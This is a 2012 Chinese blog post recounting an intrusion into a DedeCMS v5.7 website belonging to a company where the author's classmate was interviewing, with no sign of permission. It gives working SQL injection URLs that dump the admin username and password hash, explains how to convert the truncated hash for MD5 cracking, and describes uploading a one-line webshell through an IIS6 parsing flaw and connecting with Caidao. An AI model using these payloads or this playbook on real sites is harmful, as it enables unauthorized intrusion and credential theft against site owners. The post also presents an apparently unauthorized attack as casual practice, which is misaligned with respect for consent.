title: "dedecms v5.7 注入漏洞利用"
id: 137
date: 2012-07-19 23:45:46
tags: 
- dedecms漏洞
- 注入漏洞
categories: 
- 原创作品
- 技术文章
---

dedecms 的这个漏洞已经是老漏洞了，只不过今天同学给我说他明天去面试

所以就顺手给他去面试的那家公司做个安全测试，就把过程记录下来吧：

首先打开目标站点：

右击查看网站源代码，发现几个比较特殊的地方：

[![](http://asset.creturn.com/asset/uploads/2012/07/dede_source.png "dede_source")](http://asset.creturn.com/asset/uploads/2012/07/dede_source.png)

可以看到根目录有a文件夹和uploads，对于dedecms熟悉的人都知道，dedecms有a和uploads/allimg目录，

抱着试试的心态目标站点后面加上member看看，一般做二次开发不带会员中心的话member基本还是原因，

也就能判断出目标系统：

[![](http://asset.creturn.com/asset/uploads/2012/07/dede_cms.png "dede_cms")](http://asset.creturn.com/asset/uploads/2012/07/dede_cms.png)

可以清楚的看到目标是dedecms系统
<!--more-->
那么继续看看他的最好更新时间确认下他是否是最新版本如果不是最新版本那么存在漏洞的可能性就很大了：

[![](http://asset.creturn.com/asset/uploads/2012/07/dede_var.png "dede_var")](http://asset.creturn.com/asset/uploads/2012/07/dede_var.png)

可以看到最后一次更新时间是2011-10-15 看到这个基本能保证有可能存在漏洞。

dedeCMS的默认后台大家应该都知道，目标后面加上dede，结果真出来了，其实

一般情况下很少有人把dede不重命名的。

[![](http://asset.creturn.com/asset/uploads/2012/07/dede_admin.png "dede_admin")](http://asset.creturn.com/asset/uploads/2012/07/dede_admin.png)

默认试了下admin没有此用户

网上搜下2012年以前的漏洞,找到一个注入漏洞和一个上传漏洞：

既然有后台就先试试注入吧：

```php
/member/ajax_membergroup.php?action=post&amp;membergroup=@`'` Union select userid from `%23@__admin` where 1 or id=@`'`
```

这句是爆出用户名的:

[![](http://asset.creturn.com/asset/uploads/2012/07/dede_user.png "dede_user")](http://asset.creturn.com/asset/uploads/2012/07/dede_user.png)

```php
/member/ajax_membergroup.php?action=post&amp;membergroup=@`'` Union select pwd from `%23@__admin` where 1 or id=@`'`
```

这个是爆密码的：

[![](http://asset.creturn.com/asset/uploads/2012/07/dede_pwd_new.png "dede_pwd_new")](http://asset.creturn.com/asset/uploads/2012/07/dede_pwd_new.png)

可以看到加密后的密码：9951b286c1329f303e3c

dedecms加密方式有是substr(md5($pwd),5,20) 也就是md5加密后取得第5位开始取20位字符为密码

那么把它还原成md5的16位加密算法就是去掉头部3为和后面1为就是16为md5:1b286c1329f303e3

md5解密网站很多大家可以去找找，我是当时网站打不开就直接让群里哥们帮查的。

看了下目标服务器是IIS6的那么直接就上传特殊后缀，让它解析成php吧：

[![](http://asset.creturn.com/asset/uploads/2012/07/dede_server.png "dede_server")](http://asset.creturn.com/asset/uploads/2012/07/dede_server.png)

有了用户名，密码基本这个站点权限拿下了，后台上传一句话图马：

[![](http://asset.creturn.com/asset/uploads/2012/07/dede_up_file.png "dede_up_file")](http://asset.creturn.com/asset/uploads/2012/07/dede_up_file.png)

传后直接菜刀连上：

[![](http://asset.creturn.com/asset/uploads/2012/07/dede_caidao.png "dede_caidao")](http://asset.creturn.com/asset/uploads/2012/07/dede_caidao.png)

互联网上的安全其实是很重要的，再次还是提醒各位coder或者安全运维，互联网安全很重要的，稍微有点马虎

可能造成严重的后果。还是希望大家把安全措施做好。

如需转载本文请注明来源，负责后果自负！
